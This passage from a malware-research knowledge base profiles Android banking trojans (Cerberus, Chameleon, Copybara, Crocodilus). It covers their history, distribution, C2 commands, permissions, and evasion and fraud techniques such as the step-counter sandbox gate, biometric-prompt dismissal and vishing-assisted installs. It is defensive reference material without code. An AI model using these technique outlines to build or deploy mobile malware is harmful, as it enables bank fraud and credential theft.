Seen June 2019 Last Seen August 2020 (original operation) Status Source leaked September 2020, forks still active Type Banking trojan (MaaS) Attribution Russian-speaking developer(s), identity unknown Aliases Cerberus v1, Cerberus v2 Source Leaked freely on Russian-speaking underground forum after failed auction"},{"location":"malware/families/cerberus/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Cerberus appeared in June 2019 when its author began advertising rental access on underground forums. The developer claimed the trojan had been used in private operations for two years prior and was written entirely from scratch rather than derived from Anubis, a claim that ThreatFabric disputed based on code structure similarities.</p> <p>The original MaaS operation ran for roughly one year. By mid-2020, internal disputes fractured the development team. In July 2020, the author put the entire project up for auction with a starting price of $50,000 and a buy-it-now price of $100,000. The package included APK source code, the admin panel, C2 server code, installation guides, setup scripts, and the active customer list. The auction failed to attract a buyer.</p> <p>In September 2020, the author released the full source code for free to premium members of a popular Russian-speaking underground forum. Kaspersky documented an immediate spike in infections across Russia and Europe as low-skill actors began deploying their own builds. This leak directly spawned the next generation: ThreatFabric identified Alien as the first notable fork even before the public leak, followed by Ermac in 2021 and Hook in 2023.</p>"},{"location":"malware/families/cerberus/#distribution","title":"Distribution","text":"<p>Cerberus reached devices through multiple channels:</p> Vector Details Smishing SMS messages with links to fake banking or utility pages that served the APK Phishing sites Typosquatted domains mimicking legitimate app download pages Google Play droppers In July 2020, Avast discovered a Cerberus dropper disguised as a Spanish currency converter (\"Calculadora de Moneda\") with over 10,000 downloads. The app behaved legitimately for several weeks before activating dropper code to fetch the banking payload. Third-party app stores APKs distributed through unofficial Android markets <p>The dropper-on-Play technique was notable: the app passed Google Play Protect checks for weeks as a genuine currency converter, then received a C2 command that activated the dropper component to silently download and install the Cerberus banking payload.</p>"},{"location":"malware/families/cerberus/#capabilities","title":"Capabilities","text":"<p>Cerberus evolved significantly between its initial release and the v2 update in early 2020.</p>"},{"location":"malware/families/cerberus/#version-1-june-2019","title":"Version 1 (June 2019)","text":"Capability Implementation Overlay attacks WebView-based injects triggered via accessibility service foreground detection SMS interception Read, send, and forward SMS for OTP theft Contact harvesting Exfiltrate contact list to C2 Keylogging Accessibility-based keystroke capture App listing Enumerate installed packages to determine relevant inject targets Device info collection IMEI, SIM info, installed apps, device model Self-protection Hide app icon, prevent uninstallation via device admin Anti-analysis (pedometer) Used the device accelerometer as a step counter; payload only activates after a threshold of physical steps is reached, defeating sandbox and emulator analysis <p>The pedometer trick was Cerberus's most distinctive evasion technique. Since automated analysis environments and emulators do not generate real accelerometer data, the step counter never increments, and the malware stays dormant.</p>"},{"location":"malware/families/cerberus/#version-2-january-2020","title":"Version 2 (January 2020)","text":"<p>ThreatFabric's \"Year of the RAT\" report documented the v2 upgrade:</p> Capability Implementation RAT (Remote Access Trojan) TeamViewer-based remote access enabling full device control Google Authenticator theft Abuses accessibility to read 2FA codes directly from the Authenticator app UI Screen lock credential theft Captures PIN codes and swipe unlock patterns via accessibility File system traversal RAT service can browse the device file system and download contents Improved C2 protocol Refactored communication protocol with updated encryption <p>The ability to steal Google Authenticator 2FA codes was significant: rather than intercepting SMS-based OTPs, Cerberus read the codes directly from the Authenticator app's UI through accessibility events, bypassing the shift away from SMS-based 2FA.</p>"},{"location":"malware/families/cerberus/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/cerberus/#accessibility-abuse","title":"Accessibility Abuse","text":"<p>Cerberus's core functionality depends on the Android Accessibility Service. Once the user grants accessibility privileges, the malware:</p> <ol> <li>Auto-grants itself additional permissions (SMS, phone calls) without user interaction</li> <li>Monitors <code>TYPE_WINDOW_STATE_CHANGED</code> events to detect when target apps enter the foreground</li> <li>Injects WebView-based overlay screens that mimic the target app's login UI</li> <li>Logs keystrokes across all applications</li> <li>In v2, reads Google Authenticator codes and screen lock patterns</li> </ol>"},{"location":"malware/families/cerberus/#c2-communication","title":"C2 Communication","text":"<p>The C2 protocol uses HTTP POST requests to communicate with the command-and-control server. Data is encrypted before transmission. The bot registers with the C2 on first launch, sending device fingerprint data, and then polls for commands at regular intervals.</p> <p>Key C2 commands:</p> Command Action <code>push</code> Display push notification to lure user into opening an app <code>startAuthenticator2</code> Launch Google Authenticator and capture displayed codes <code>startApp</code> Open a specified application (triggers overlay) <code>getContacts</code> Exfiltrate contact list <code>getAccounts</code> Steal accounts stored on device <code>sentSMS</code> Send SMS from victim device <code>startForward</code> Forward incoming calls to attacker-specified number <code>startScreenVNC</code> (v2) Initialize RAT session"},{"location":"malware/families/cerberus/#anti-analysis","title":"Anti-Analysis","text":"Technique Method Pedometer gate Reads <code>TYPE_STEP_COUNTER</code> sensor; payload dormant until step threshold is met Emulator detection Checks build properties, SIM state, and hardware characteristics Delayed activation Play Store droppers wait weeks before activating malicious behavior String obfuscation Critical strings encrypted and resolved at runtime"},{"location":"malware/families/cerberus/#inject-architecture","title":"Inject Architecture","text":"<p>Overlay injects are HTML/CSS/JS files hosted on the C2, one per target application. When the malware detects a target app in the foreground via accessibility, it requests the corresponding inject by package name. The WebView renders the inject fullscreen over the legitimate app. Submitted credentials are POSTed back to C2.</p>"},{"location":"malware/families/cerberus/#permissions","title":"Permissions","text":"Permission Purpose BIND_ACCESSIBILITY_SERVICE Core dependency for overlay triggering, keylogging, auto-granting permissions, and reading Authenticator codes SYSTEM_ALERT_WINDOW Display overlay injections over banking apps READ_SMS Read incoming SMS for OTP interception RECEIVE_SMS Intercept SMS in real-time SEND_SMS Send SMS from the victim device READ_CONTACTS Exfiltrate the contact list READ_PHONE_STATE Collect device identifiers (IMEI, SIM info) INTERNET C2 communication RECEIVE_BOOT_COMPLETED Persistence across reboots BIND_DEVICE_ADMIN Prevent uninstallation via device admin"},{"location":"malware/families/cerberus/#target-regions-and-financial-institutions","title":"Target Regions and Financial Institutions","text":"<p>Cerberus primarily targeted European banking customers, with inject kits covering institutions across:</p> Region Countries Western Europe Spain, France, Italy, Netherlands, UK Eastern Europe Turkey, Poland North America United States Asia-Pacific Australia, India (SBI, ICICI) <p>The MaaS model meant targeting depended on individual operators. The core team maintained inject kits for major European banks, while renters could commission custom injects for specific targets. Spanish financial institutions were particularly well-represented, consistent with the Google Play dropper campaign that exclusively targeted Spanish users.</p>"},{"location":"malware/families/cerberus/#notable-campaigns","title":"Notable Campaigns","text":"<p>June 2019: Cerberus first identified by ThreatFabric being advertised on underground forums at $2,000/month for private use or $7,000/month with the full feature set.</p> <p>January 2020: The v2 release added RAT capabilities and Google Authenticator theft. ThreatFabric covered the upgrade in their \"Year of the RAT\" report, noting Cerberus had taken over from Anubis as the dominant rented banking malware.</p> <p>July 2020: Avast discovered a Cerberus dropper on Google Play disguised as \"Calculadora de Moneda,\" a Spanish currency converter app with 10,000+ downloads.</p> <p>July 2020: The failed auction. Source code offered for $50,000-$100,000 after the team dissolved.</p> <p>August 2020: ThreatFabric published \"Alien: the story of Cerberus' demise\", documenting the project's collapse and the emergence of Alien as the first Cerberus fork.</p> <p>September 2020: Full source code leaked on underground forums. Kaspersky reported an immediate surge in infections across Russia and Europe as new actors began deploying the freely available code.</p> <p>October 2020 onward: The post-leak ecosystem. Cerberus source became the foundation for Ermac (2021), Hook (2023), and numerous unattributed variants that continue to surface. Cyble tracked campaigns like \"ErrorFather\" still deploying Cerberus-derived code as late as 2024, incorporating Domain Generation Algorithms (DGA) and updated obfuscation on top of the original codebase.</p>"},{"location":"malware/families/cerberus/#references","title":"References","text":"<ul> <li>ThreatFabric - Cerberus: A new banking Trojan from the underworld (June 2019)</li> <li>ThreatFabric - 2020: Year of the RAT (January 2020)</li> <li>Avast - Cerberus dropper on Google Play (July 2020)</li> <li>ThreatFabric - Alien: the story of Cerberus' demise (August 2020)</li> <li>Security Affairs - Cerberus Android trojan auction (July 2020)</li> <li>Security Affairs - Cerberus source code leaked (September 2020)</li> <li>Kaspersky - The rise of Cerberus</li> <li>Bleeping Computer - Cerberus can bypass 2FA (February 2020)</li> <li>Cyble - ErrorFather's deployment of Cerberus (2024)</li> </ul>"},{"location":"malware/families/chameleon/","title":"Chameleon","text":"<p>Chameleon is the Android banking trojan that introduced a technique for bypassing biometric authentication prompts to force PIN entry, enabling credential capture through keylogging. Cyble first identified it in early 2023 targeting Australian and Polish users. A significantly upgraded second version, analyzed by ThreatFabric in December 2023, added the biometric bypass alongside the ability to circumvent Android 13's restricted settings protections. By mid-2024, ThreatFabric observed Chameleon expanding into Canada and broader European targeting through campaigns masquerading as CRM applications.</p>"},{"location":"malware/families/chameleon/#overview","title":"Overview","text":"Attribute Details First Seen January 2023 Last Seen Active (ongoing campaigns as of 2024) Status Active, under continued development Type Banking trojan Attribution Unknown Aliases Chameleon v1, Chameleon v2"},{"location":"malware/families/chameleon/#vendor-names","title":"Vendor Names","text":"Vendor Name ThreatFabric Chameleon Cyble Chameleon ESET Android/Spy.Banker.Chameleon Kaspersky HEUR:Trojan-Banker.AndroidOS.Chameleon Fortinet Android/Banker.Chameleon Malwarebytes Android/Trojan.Banker.Chameleon MITRE ATT&amp;CK S1083"},{"location":"malware/families/chameleon/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Chameleon is an independent family with no known code lineage to other established banking trojans. Cyble's initial analysis in April 2023 noted that while the malware used standard banking trojan techniques (overlay injection, keylogging, SMS theft), its codebase did not derive from any leaked source (Cerberus, Anubis, etc.). Cyble assessed it was in early development stages, with several commands stubbed out but not yet functional.</p> <p>The v2 release in late 2023 represented a substantial capability jump. ThreatFabric's analysis showed a malware that had matured rapidly, adding technically sophisticated features like the biometric bypass and Android 13 restricted settings circumvention.</p>"},{"location":"malware/families/chameleon/#distribution","title":"Distribution","text":"<p>Chameleon uses multi-stage delivery chains, with Zombinder playing a key role in the v2 distribution.</p> Vector Details Fake Chrome APKs Both v1 and v2 samples frequently masquerade as Google Chrome Zombinder DaaS v2 distributed via Zombinder, a dropper-as-a-service that binds malicious payloads to legitimate apps. ThreatFabric noted Zombinder samples deploying Chameleon alongside Hook. Compromised websites Lure pages mimicking legitimate download portals Discord attachments Malicious APKs shared through Discord channels Bitbucket hosting APKs hosted on Bitbucket repositories for download Fake CRM apps 2024 campaign used CRM app lures targeting hospitality sector employees"},{"location":"malware/families/chameleon/#zombinder-delivery-chain","title":"Zombinder Delivery Chain","text":"<p>The v2 delivery via Zombinder follows a two-stage process:</p> <ol> <li>Victim installs a seemingly legitimate app that has been bound with a Zombinder dropper</li> <li>Dropper bypasses Android 13+ restricted settings and deploys Chameleon as a secondary payload</li> <li>Chameleon activates and requests accessibility permissions</li> </ol>"},{"location":"malware/families/chameleon/#crm-campaign-2024","title":"CRM Campaign (2024)","text":"<p>ThreatFabric's July 2024 report documented a campaign targeting employees of an international Canadian restaurant chain. The dropper displayed a fake CRM login page requesting an employee ID, then prompted a \"reinstall\" that was actually the Chameleon payload. The CRM theme was chosen specifically to target B2C employees likely to have access to corporate banking.</p>"},{"location":"malware/families/chameleon/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/chameleon/#version-1-january-2023","title":"Version 1 (January 2023)","text":"<p>Cyble documented v1 as functional but still in development:</p> Capability Implementation Overlay attacks Inject phishing pages over target banking and crypto apps Keylogging Accessibility service based keystroke capture SMS theft Intercept and exfiltrate SMS messages for OTP capture Cookie theft Steal cookies from the device browser Contact harvesting Exfiltrate device contacts App listing Enumerate installed packages Self-protection Disable Google Play Protect, prevent uninstallation Stubbed commands Several bot commands present in code but not yet implemented"},{"location":"malware/families/chameleon/#version-2-december-2023","title":"Version 2 (December 2023)","text":"<p>ThreatFabric's v2 analysis revealed two headline features:</p> Capability Implementation Biometric prompt bypass Forces device to fall back from fingerprint/face unlock to PIN/pattern entry, enabling capture via keylogger Android 13 restricted settings bypass Displays an HTML page guiding the user to enable accessibility on devices enforcing Android 13's restricted settings Device takeover (DTO) Full device control via accessibility for on-device fraud Task scheduling Improved job scheduling for persistent operation Expanded targeting Added UK and Italian banking apps to overlay targets"},{"location":"malware/families/chameleon/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/chameleon/#biometric-authentication-bypass","title":"Biometric Authentication Bypass","text":"<p>Chameleon v2's most significant technique targets the biometric authentication prompt. The implementation:</p> <ol> <li>Uses the <code>KeyguardManager</code> API to assess device lock screen status</li> <li>Monitors <code>AccessibilityEvent</code> data to detect when a biometric prompt (fingerprint, face) is displayed</li> <li>Issues an accessibility action to dismiss the biometric prompt</li> <li>Device falls back to PIN, pattern, or password authentication</li> <li>Keylogger captures the entered PIN/pattern/password</li> </ol> <p>The stolen PIN serves two purposes: it enables the operators to unlock the device at will during remote access sessions, and the credentials themselves are valuable since biometric data cannot be extracted through keylogging but PINs can.</p>"},{"location":"malware/families/chameleon/#android-13-restricted-settings-bypass","title":"Android 13 Restricted Settings Bypass","text":"<p>Android 13 introduced \"restricted settings\" that block sideloaded apps from requesting accessibility service and notification listener permissions. Chameleon v2 counters this by displaying an HTML instruction page that walks the victim through manually enabling accessibility for the app via Settings, step by step. The page mimics a legitimate system prompt.</p>"},{"location":"malware/families/chameleon/#accessibility-abuse","title":"Accessibility Abuse","text":"<p>Once accessibility is granted, Chameleon v2 operates with the standard banking trojan pattern with several additions:</p> <ol> <li>Auto-grants additional permissions without user interaction</li> <li>Monitors foreground app changes via <code>TYPE_WINDOW_STATE_CHANGED</code></li> <li>Triggers overlay injection for target banking apps</li> <li>Captures keystrokes globally, including PIN/pattern entry</li> <li>Dismisses biometric prompts to force PIN fallback</li> <li>Disables Google Play Protect to prevent detection</li> <li>Prevents navigation to app settings to block uninstallation</li> </ol>"},{"location":"malware/families/chameleon/#c2-communication","title":"C2 Communication","text":"<p>Chameleon communicates with its C2 over HTTP. The bot:</p> <ul> <li>Registers with device fingerprint on first launch</li> <li>Retrieves target application list and inject URLs</li> <li>Polls for commands at regular intervals</li> <li>Exfiltrates captured credentials, SMS, and cookies</li> </ul>"},{"location":"malware/families/chameleon/#anti-analysis","title":"Anti-Analysis","text":"Technique Method Emulator detection Checks device properties and sensor availability Zombinder packing v2 delivered through DaaS packer to evade static detection Play Protect disabling Actively disables Google Play Protect on infection Dynamic payloads Dropper retrieves actual payload post-installation"},{"location":"malware/families/chameleon/#target-regions-and-financial-institutions","title":"Target Regions and Financial Institutions","text":"<p>Chameleon's geographic scope expanded with each version iteration.</p> Version Regions Target Types v1 (Jan 2023) Australia, Poland Banking apps, cryptocurrency apps (CoinSpot), government agency impersonation v2 (Dec 2023) Australia, Poland, UK, Italy European banking apps, expanded crypto targeting CRM campaign (Jul 2024) Canada, Europe Hospitality sector corporate banking, B2C employee targeting <p>Australian and Polish institutions were the original and most consistent targets. The v2 expansion into the UK and Italy aligned with distribution through Zombinder, which has a broad European operator base.</p>"},{"location":"malware/families/chameleon/#notable-campaigns","title":"Notable Campaigns","text":"<p>January 2023: Chameleon first observed in the wild, targeting Australian and Polish users. Samples impersonated the CoinSpot cryptocurrency app, Australian government agencies, and the Polish IKO banking app.</p> <p>April 2023: Cyble published the initial discovery analysis, documenting the malware's capabilities, distribution through compromised websites and Discord, and assessment that it was still in early development.</p> <p>December 2023: ThreatFabric published the v2 analysis revealing the biometric bypass and Android 13 restricted settings circumvention. Distribution via Zombinder was confirmed, with samples masquerading as Google Chrome. Targeting expanded to UK and Italian banking customers.</p> <p>July 2024: ThreatFabric reported a new campaign targeting hospitality sector employees in Canada and Europe through fake CRM applications. The campaign used multi-stage droppers that displayed a fake CRM login page before deploying Chameleon. This marked a shift toward targeting corporate banking access rather than individual consumers.</p>"},{"location":"malware/families/chameleon/#references","title":"References","text":""},{"location":"malware/families/copybara/","title":"Copybara","text":"<p>Copybara is an Italian-focused Android banking trojan distributed primarily through Telephone-Oriented Attack Delivery (TOAD), where operators use voice phishing (vishing) to guide victims into installing the malware. Cleafy first identified the family in November 2021. ThreatFabric clarified its relationship to the broader BRATA ecosystem in mid-2022, establishing that Copybara, while sharing the B4A development framework with BRATA and AmexTroll, is a distinct family with its own codebase, C2 protocol, and operational focus. Later variants adopted the MQTT protocol for command-and-control, analyzed in depth by Zscaler ThreatLabz and ThreatFabric.</p>"},{"location":"malware/families/copybara/#overview","title":"Overview","text":"Attribute Details First Seen November 2021 Last Seen Active (ongoing campaigns) Status Active, under continued development Type Banking trojan with On-Device Fraud (ODF) Attribution Unknown; operations concentrated against Italian financial sector Aliases CopyBara, BRATA variant (misattribution) Development Tool B4A (Basic4Android) framework C2 Protocol MQTT (latest variants), HTTP (earlier variants)"},{"location":"malware/families/copybara/#vendor-names","title":"Vendor Names","text":"Vendor Name Cleafy Copybara ThreatFabric Copybara Zscaler Copybara Kaspersky HEUR:Trojan-Banker.AndroidOS.Copybara ESET Android/Spy.Banker.Copybara Trend Micro AndroidOS_Copybara Dr.Web Android.BankBot.Copybara Malwarebytes Android/Trojan.Banker.Copybara"},{"location":"malware/families/copybara/#origin-and-lineage","title":"Origin and Lineage","text":"<p>ThreatFabric's \"BRATA: a tale of three families\" analysis resolved significant naming confusion in the security community. What researchers had collectively labeled \"BRATA\" was actually three separate families:</p> Family Relationship Distinguishing Feature BRATA Original family Brazilian origin, factory reset capability AmexTroll Related but distinct Expanded to UK/Australian targets, \"black overlay\" technique Copybara Related but distinct Italian focus, MQTT-based C2, TOAD distribution <p>All three families share the B4A (Basic4Android) development framework, which became free in February 2020. ThreatFabric observed Copybara and AmexTroll being distributed simultaneously through different channels in the first half of 2022, confirming they are separate operations rather than sequential versions of the same malware. The families differ in code implementation, scope, and likely operators.</p> <p>Copybara's evolution tracks from late 2021 through multiple updates. The November 2023 variant documented by Zscaler introduced MQTT-based C2 communication, replacing earlier HTTP protocols with a lightweight messaging protocol optimized for persistent bidirectional communication.</p>"},{"location":"malware/families/copybara/#distribution","title":"Distribution","text":"<p>Copybara's distribution is defined by TOAD: the combination of social engineering phishing with live voice calls to guide victims through installation.</p> Vector Details Smishing Initial contact via SMS spoofed to appear from the victim's bank, containing a link to a phishing page that collects contact details Vishing (TOAD) Attacker calls the victim, posing as bank support, and instructs them to download a \"security application\" Fake banking apps APKs disguised with legitimate bank logos and authentic-sounding names: \"Caixa Sign Nueva,\" \"BBVA Codigo,\" \"Sabadell Codigo\" Phishing websites Landing pages that mimic bank portals, used to collect personal information before the vishing call"},{"location":"malware/families/copybara/#toad-attack-flow","title":"TOAD Attack Flow","text":"<p>ThreatFabric's TOAD analysis documented the full attack chain:</p> <ol> <li>Victim receives SMS appearing to be from their bank with a link to a phishing page</li> <li>Victim enters personal information and contact details on the phishing page</li> <li>Attacker calls the victim, impersonating bank support, referencing the information just entered</li> <li>Caller instructs the victim to download and install a \"security app\" to protect their account</li> <li>Caller guides the victim through granting accessibility and other permissions</li> <li>Copybara activates, giving the operator remote access to the device</li> <li>Operator performs On-Device Fraud via the victim's banking app</li> </ol> <p>The vishing component is essential to Copybara's success: the live caller builds trust, creates urgency, and walks the victim past every permission prompt and sideloading warning that would otherwise stop the installation.</p>"},{"location":"malware/families/copybara/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/copybara/#core-capabilities","title":"Core Capabilities","text":"Capability Implementation On-Device Fraud (ODF) Remote control of victim device for direct banking transactions via accessibility service Remote device control Full VNC-style interaction for navigating banking apps, initiating transfers Overlay attacks Credential phishing overlays impersonating banking and cryptocurrency apps Keylogging Accessibility-based keystroke capture across all applications Audio recording Record ambient audio via device microphone Video recording Capture device screen activity SMS interception Read and forward SMS for OTP capture Screen capture Capture screenshots during fraud operations Credential theft Phishing pages for banking and cryptocurrency exchange logins"},{"location":"malware/families/copybara/#mqtt-variant-november-2023","title":"MQTT Variant (November 2023)","text":"<p>Zscaler's technical analysis documented 59 supported bot commands in the MQTT-based variant:</p> Category Details Communication MQTT protocol on port 52997, subscribing to <code>commands_FromPC</code> queue Device control Remote tap, swipe, type, navigate, screenshot Data exfiltration SMS, contacts, accounts, installed apps, browser cookies Persistence Disable battery optimization, run as foreground service, prevent uninstallation Fraud Overlay injection, keylogging, OTP interception, screen lock credential capture"},{"location":"malware/families/copybara/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/copybara/#mqtt-command-and-control","title":"MQTT Command-and-Control","text":"<p>The shift from HTTP to MQTT in the November 2023 variant represents a significant architectural change. MQTT (Message Queuing Telemetry Transport) is a lightweight publish/subscribe messaging protocol designed for IoT and constrained environments:</p> <ul> <li>The malware connects to an MQTT broker on port 52997</li> <li>Subscribes to a <code>commands_FromPC</code> queue for receiving operator commands</li> <li>Publishes stolen data and status updates to separate queues</li> <li>Persistent connection enables real-time bidirectional communication without HTTP polling overhead</li> <li>Connection remains open for the duration of the fraud session</li> </ul> <p>MQTT offers operational advantages over HTTP for banking fraud: lower latency for interactive remote control sessions, reduced network overhead, and persistent connections that survive brief network interruptions.</p>"},{"location":"malware/families/copybara/#accessibility-abuse","title":"Accessibility Abuse","text":"<p>Copybara's On-Device Fraud depends on Android's accessibility service:</p> <ol> <li>Victim grants accessibility during TOAD-guided installation</li> <li>Malware auto-grants additional permissions (SMS, phone, storage, microphone)</li> <li>Monitors foreground application changes for overlay triggering</li> <li>Provides remote control functionality for operator-driven fraud</li> <li>Captures keystrokes and screen content during banking sessions</li> <li>Prevents navigation to settings to block uninstallation</li> </ol>"},{"location":"malware/families/copybara/#overlay-phishing-pages","title":"Overlay Phishing Pages","text":"<p>Zscaler documented that Copybara downloads phishing pages from C2 that impersonate popular cryptocurrency exchanges and financial institutions. The pages use legitimate logos and application names to convince victims entering credentials. Overlay injection is triggered when the accessibility service detects a target app entering the foreground.</p>"},{"location":"malware/families/copybara/#b4a-framework","title":"B4A Framework","text":"<p>Like BRATA and AmexTroll, Copybara is built using the B4A (Basic4Android) development framework. B4A uses a BASIC-like language and generates standard Android APKs. The framework produces a recognizable code structure in decompiled output, which aided ThreatFabric in identifying the relationship between the three families.</p>"},{"location":"malware/families/copybara/#anti-analysis","title":"Anti-Analysis","text":"Technique Method String obfuscation Sensitive strings encrypted and resolved at runtime Emulator detection Checks build properties and hardware characteristics Locale check Verifies device language/region matches Italian or Spanish targets Dynamic payloads Overlay pages and configuration retrieved from C2 post-installation"},{"location":"malware/families/copybara/#target-regions-and-financial-institutions","title":"Target Regions and Financial Institutions","text":"<p>Copybara maintains a narrow geographic focus centered on Italian and Spanish financial institutions.</p> Region Details Italy Primary target, majority of all observed campaigns Spain Secondary target, fake apps impersonating BBVA, Caixa, Sabadell UK Targeted in cross-campaign activity documented by Cleafy <p>Cleafy's fraud campaign analysis documented campaigns from late 2023 through early 2024 targeting Italian, Spanish, and UK banking customers. The stolen funds were transferred to a well-organized network of money mule accounts via instant payment systems.</p> <p>Italian banks remain the core focus. The TOAD distribution method requires Italian-speaking (or Spanish-speaking) operators who can convincingly impersonate bank support staff, which naturally constrains the geographic scope.</p>"},{"location":"malware/families/copybara/#notable-campaigns","title":"Notable Campaigns","text":"<p>November 2021: Copybara first identified by Cleafy, targeting Italian banking customers through phishing sites and early TOAD delivery methods.</p> <p>First half 2022: ThreatFabric observes Copybara and AmexTroll distributed simultaneously through different channels, confirming they are separate families despite shared B4A framework lineage.</p> <p>October 2022: ThreatFabric publishes TOAD fraud analysis, documenting the full vishing attack chain used to deploy Copybara against Italian banking customers. The research details how operators combine phishing sites with live phone calls to guide victims through installation and permission granting.</p> <p>November 2023: The MQTT variant emerges. Zscaler ThreatLabz publishes technical analysis documenting 59 bot commands and the shift from HTTP to MQTT-based C2 communication.</p> <p>Late 2023 - Early 2024: Cleafy intercepts an active fraud campaign against UK, Spanish, and Italian banking customers. The full fraud chain is traced from initial social engineering to fraudulent wire transfers routed through money mule networks. The campaign uses both smishing and vishing to distribute Copybara, with fake apps impersonating Spanish banks including BBVA, Caixa, and Sabadell.</p>"},{"location":"malware/families/copybara/#references","title":"References","text":""},{"location":"malware/families/crocodilus/","title":"Crocodilus","text":"<p>Crocodilus is a device-takeover Android banking trojan that ThreatFabric discovered in March 2025 targeting banks and cryptocurrency wallets in Spain and Turkey. Unlike many newcomers that iterate from leaked source code or simple forks, Crocodilus arrived as a fully mature threat with remote control, black screen overlays, an accessibility logger that captures every screen element, and a novel contact list injection technique that plants fake \"Bank Support\" entries on the victim's phone to enable convincing vishing calls. By June 2025, ThreatFabric reported that Crocodilus had expanded to eight countries and added automated cryptocurrency seed phrase harvesting, confirming its trajectory as one of the fastest-evolving mobile threats of the year.</p>"},{"location":"malware/families/crocodilus/#overview","title":"Overview","text":"Attribute Details First Seen March 2025 Status Active, rapidly expanding globally Type Banking trojan, device takeover, MaaS Attribution Unknown Distribution Proprietary dropper bypassing Android 13+ restrictions"},{"location":"malware/families/crocodilus/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Crocodilus has no known code lineage to existing Android banking trojan families. ThreatFabric's initial analysis emphasized that the malware entered the scene as a fully-fledged threat rather than evolving incrementally from a simpler predecessor or forking from leaked source code. The initial samples contained debug-language artifacts suggesting a Turkish-speaking developer, though attribution remains unconfirmed.</p> <p>The speed of Crocodilus's feature development and geographic expansion suggests experienced operators. Within three months of initial discovery, ThreatFabric documented significant capability upgrades and expansion from two countries to eight, a pace that exceeds most new families.</p>"},{"location":"malware/families/crocodilus/#distribution","title":"Distribution","text":"<p>Crocodilus uses a proprietary dropper that bypasses Android 13+ restrictions on sideloaded apps. This is significant because Android 13 introduced tighter controls on granting accessibility service permissions to apps installed outside of official stores. The dropper circumvents these protections, allowing Crocodilus to obtain the accessibility permissions it needs for device takeover.</p> Vector Details Proprietary dropper Custom-built dropper that bypasses Android 13+ accessibility restrictions Social engineering Lures disguised as legitimate applications MaaS distribution Operators distribute through their own channels"},{"location":"malware/families/crocodilus/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/crocodilus/#core-features","title":"Core Features","text":"Capability Implementation Remote control Full device takeover through accessibility service Black screen overlay Displays black screen to hide remote operations from the victim Accessibility logger Captures all screen elements displayed on the device, not just keystrokes Credential theft Overlay attacks targeting banking and cryptocurrency apps Contact list injection Adds fake \"Bank Support\" contact entries to the victim's phone Seed phrase collector Automated harvesting of cryptocurrency wallet recovery phrases SMS interception Reads and forwards SMS for OTP capture"},{"location":"malware/families/crocodilus/#accessibility-logger","title":"Accessibility Logger","text":"<p>Crocodilus goes beyond standard keylogging by implementing a comprehensive accessibility logger that captures every element displayed on screen. This includes text fields, labels, buttons, and any other UI component rendered by the foreground application. The result is a complete record of everything the victim sees and interacts with, providing operators with credentials, account balances, transaction details, and seed phrases without requiring targeted overlay pages for each application.</p>"},{"location":"malware/families/crocodilus/#contact-list-injection","title":"Contact List Injection","text":"<p>The contact list injection technique is novel among Android banking trojans. Crocodilus writes fake entries directly into the victim's contact list, typically adding numbers labeled as \"Bank Support\" or similar trusted names. When the operators later call the victim from those numbers, the victim's phone displays the spoofed contact name, making the incoming call appear to originate from their bank. This enables highly convincing vishing (voice phishing) calls where the attacker poses as bank support staff and instructs the victim to approve transactions or provide additional credentials.</p>"},{"location":"malware/families/crocodilus/#cryptocurrency-seed-phrase-harvesting","title":"Cryptocurrency Seed Phrase Harvesting","text":"<p>ThreatFabric's June 2025 update documented an automated seed phrase collection mechanism. When the victim opens a cryptocurrency wallet app, Crocodilus displays a social engineering overlay instructing them to \"back up\" their wallet key by entering their seed phrase. The accessibility logger captures the entered phrase, which is then exfiltrated to the C2 server. This approach avoids the need for OCR-based seed theft from screenshots, instead tricking the victim into entering the phrase directly.</p>"},{"location":"malware/families/crocodilus/#permissions","title":"Permissions","text":"Permission Purpose BIND_ACCESSIBILITY_SERVICE Core dependency for device takeover, screen logging, and remote control SYSTEM_ALERT_WINDOW Display overlay injections and black screen during remote sessions READ_SMS Intercept SMS for OTP capture RECEIVE_SMS Real-time SMS interception READ_CONTACTS Read existing contacts before injecting fake entries WRITE_CONTACTS Inject fake \"Bank Support\" contact entries READ_PHONE_STATE Device fingerprinting INTERNET C2 communication REQUEST_INSTALL_PACKAGES Dropper installs main payload RECEIVE_BOOT_COMPLETED Persistence across reboots FOREGROUND_SERVICE Maintain persistent background operation"},{"location":"malware/families/crocodilus/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/crocodilus/#dropper-mechanism","title":"Dropper Mechanism","text":"<p>The proprietary dropper is a key technical differentiator. Android 13 introduced restrictions that prevent sideloaded apps from requesting accessibility service permissions, which is a critical dependency for device-takeover malware. Crocodilus's dropper bypasses this restriction through an implementation that ThreatFabric described as purpose-built to defeat current platform protections. The specifics of the bypass technique make Crocodilus one of the few families with a working solution for Android 13+ accessibility restrictions at the time of discovery.</p>"},{"location":"malware/families/crocodilus/#black-screen-overlay","title":"Black Screen Overlay","text":"<p>During remote access sessions, Crocodilus activates a black screen overlay combined with audio muting. This hides the operator's activity from the victim, who sees only a black screen and assumes the device is locked or idle. The technique is shared with other device-takeover trojans like Octo and Hook, but Crocodilus implements it alongside the full accessibility logger for comprehensive session capture.</p>"},{"location":"malware/families/crocodilus/#c2-communication","title":"C2 Communication","text":"<p>Crocodilus communicates with its command-and-control infrastructure over encrypted channels. The C2 delivers overlay injection targets, receives exfiltrated credentials and accessibility logs, and sends remote control commands for device takeover sessions.</p>"},{"location":"malware/families/crocodilus/#c2-infrastructure","title":"C2 Infrastructure","text":"Component Details Protocol HTTPS with encrypted payloads Data flow Bidirectional -- C2 pushes overlay configs and commands; bot sends credentials, accessibility logs, and device info Overlay delivery Injection HTML served from C2 and rendered in WebView Remote sessions Real-time command channel for device takeover operations Infrastructure rotation Observed domain changes between campaigns, suggesting operator-managed infrastructure"},{"location":"malware/families/crocodilus/#target-regions","title":"Target Regions","text":"Phase Period Regions Initial March 2025 Spain, Turkey Expansion By June 2025 Spain, Turkey, Argentina, Brazil, India, Indonesia, United States, and additional countries <p>The initial targeting of Spain and Turkey, combined with Turkish-language debug strings in early samples, suggests the developers had established connections in these markets. The rapid expansion to Latin America, South Asia, and the US within three months demonstrates the operators' ambition and capability to scale operations globally.</p> <p>Crocodilus also targets 